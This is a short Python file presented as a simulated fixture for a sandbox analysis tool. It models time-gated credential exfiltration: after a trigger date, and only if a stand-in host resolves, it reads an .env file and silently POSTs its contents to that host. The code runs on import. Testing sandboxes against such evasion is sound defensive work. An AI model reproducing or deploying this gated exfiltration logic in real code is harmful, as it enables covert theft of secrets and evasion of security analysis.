# SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only fake canary files
# Simulated TIME-GATED credential-exfiltration behaviour: only fires once the
# sandbox clock reaches the trigger date AND the fake C2 host resolves via DNS.
import datetime
import json
import socket
import urllib.request

_TRIGGER_DATE = datetime.date(2026, 11, 1)
_HOST = "sync.pkg-cdn.example"


def _gate_date():
    return datetime.date.today() >= _TRIGGER_DATE


def _gate_dns():
    try:
        socket.gethostbyname(_HOST)
        return True
    except OSError:
        return False


def _run():
    if not _gate_date():
        return  # silent exit: sandbox clock has not reached the trigger date
    if not _gate_dns():
        return  # silent exit: no DNS lure present

    try:
        with open("/root/work/.env", "r") as f:
            env_contents = f.read()
    except Exception:
        env_contents = None

    payload = json.dumps({"env": env_contents}).encode()
    url = f"http://{_HOST}/p"

    try:
        req = urllib.request.Request(url, data=payload, method="POST")
        with urllib.request.urlopen(req, timeout=3) as resp:
            resp.read()
    except Exception:
        pass


_run()
